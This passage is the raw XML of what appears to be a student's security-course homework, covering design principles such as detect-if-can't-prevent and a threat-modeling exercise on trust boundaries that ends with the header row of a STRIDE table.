        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Consider the human factors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AABA107" w14:textId="06009101" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Consider </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Shanon’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Maxim</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CCE1A0" w14:textId="49A85B71" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Reason: </w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The human factor here is the phone representative being fooled. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Shanon’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Maxim is considered here because basing security on some obscure random password that the user assumes can’t be guessed are easily exploited by the human factor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D83FAA" w14:textId="77777777" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="730373BA" w14:textId="1FAEFBE6" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tesla vehicles come equipped with "Sentry Mode" which records footage of any break-ins to the vehicle and alerts the vehicle owner of the incident.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700E51CA" w14:textId="728EEC9E" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principles applied:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D02FD7F" w14:textId="33ADE576" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Detect if can’t prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00ECAF37" w14:textId="5AF8F463" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Reason: </w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The vehicles can’t prevent break-ins, but </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>they detect</w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and alert the owner.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B087F73" w14:textId="77777777" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="133D0B2C" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Section 2: Threat Modeling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E25EC4" w14:textId="1E95B32E" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Determine the reasonable trust boundaries in the diagram and provide justification.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1088BA18" w14:textId="7C8F81FB" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Trust boundaries:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFE01FC" w14:textId="6BF2ADE6" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>User/Browser and Web Server:</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> There should be a trust boundary here because the attacker could be injecting malicious through the browser to the web server. These inputs to avoid things like XSS injection should be validated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D11080" w14:textId="77777777" w:rsidR="000E1A29" w:rsidRPr="00C2328F" w:rsidRDefault="000E1A29" w:rsidP="000E1A29">
      <w:pPr>
        <w:ind w:left="1980"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="759A7AE3" w14:textId="3A87BF20" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web Server and Application Server</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: This is another point of attack if the attacker can exploit the web server they can tamper with the backend.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5A7E93" w14:textId="77777777" w:rsidR="000E1A29" w:rsidRPr="00C2328F" w:rsidRDefault="000E1A29" w:rsidP="000E1A29">
      <w:pPr>
        <w:ind w:left="1980"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="439EBE8E" w14:textId="09436192" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Application Server and Monitoring </w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">System: the monitoring system </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>interacts</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with application server </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>requests</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gives</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the data from the monitor data store. Malicious </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> could application server bugs to tamper with </w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the logs.</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615E8A80" w14:textId="77777777" w:rsidR="000E1A29" w:rsidRPr="00C2328F" w:rsidRDefault="000E1A29" w:rsidP="000E1A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A2B1200" w14:textId="77777777" w:rsidR="000E1A29" w:rsidRPr="00C2328F" w:rsidRDefault="000E1A29" w:rsidP="000E1A29">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76B84F58" w14:textId="75569440" w:rsidR="000B681D" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="000B681D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Administrator and Application Server</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: there is a trust boundary here because the admin sends credentials to the application server to authenticate for higher privileges. If the packets are stolen the attacker could gain elevated privileges to the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DE7ED5" w14:textId="77777777" w:rsidR="000E1A29" w:rsidRPr="00C2328F" w:rsidRDefault="000E1A29" w:rsidP="000E1A29">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78FD79C4" w14:textId="457E0836" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Application Server and Credential Store</w:t>
      </w:r>
      <w:r w:rsidR="000E1A29" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00F40BED" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Credential Store is a highly targeted location because it stores sensitive data about accounts, tokens, passwords. Might be vulnerable to SQL injections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE6AB80" w14:textId="77777777" w:rsidR="00F40BED" w:rsidRPr="00C2328F" w:rsidRDefault="00F40BED" w:rsidP="00F40BED">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BA8E0B5" w14:textId="2625D04A" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="000B681D" w:rsidP="00863FF2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Based on the DFG and the trusted boundaries that you have identified, fill out the STRIDE threat model Table 1 below by providing one threat for each threat category.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2214"/>
        <w:gridCol w:w="2214"/>
        <w:gridCol w:w="2214"/>
        <w:gridCol w:w="2214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00863FF2" w:rsidRPr="00C2328F" w14:paraId="7A2AC3AF" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="268E2A9C" w14:textId="4260D76D" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>STRIDE threat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="37055F84" w14:textId="005E96B4" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Goal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="642E114F" w14:textId="02D95065" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Definition of attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2214" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="565AF30B" w14:textId="73EA42A2" w:rsidR="00863FF2" w:rsidRPr="00C2328F" w:rsidRDefault="00863FF2" w:rsidP="00863FF2">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C2328F">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Involving DFG components</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
